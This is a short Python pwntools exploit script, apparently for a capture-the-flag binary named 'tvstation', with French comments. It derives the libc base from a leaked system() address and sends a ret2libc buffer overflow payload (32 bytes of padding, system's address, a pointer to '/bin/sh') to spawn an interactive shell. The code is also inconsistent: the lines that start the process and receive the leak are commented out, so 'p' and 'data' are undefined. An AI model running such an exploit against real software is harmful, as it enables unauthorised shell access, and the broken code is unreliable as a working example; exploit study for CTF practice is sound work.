from pwn import *


context(os="linux", arch="i386")

# p = process("./bin/tvstation")
# gdb.attach(p, """
# b *0x08048669
# c
# """)

# p.sendline("4")
print 4
# data = p.recv()

# libc_system = int(data.split("@")[1].split("\n")[0], 16)
libc_system = int(data.split("@")[1].split("\n")[0], 16)

libc_system_offset = 0x3e3e0
libc_base = libc_system - libc_system_offset

binsh_offset = 0x15f771
binsh = libc_base + binsh_offset

payload = "A" * 32 # Padding jusqu'a l'adresse de retour
payload += p32(libc_system) # Ecraser adresse de retour par adresse de system
payload += p32(binsh) # Argument 1 (pointeur vers "/bin/sh")

p.sendline(payload)
p.interactive()
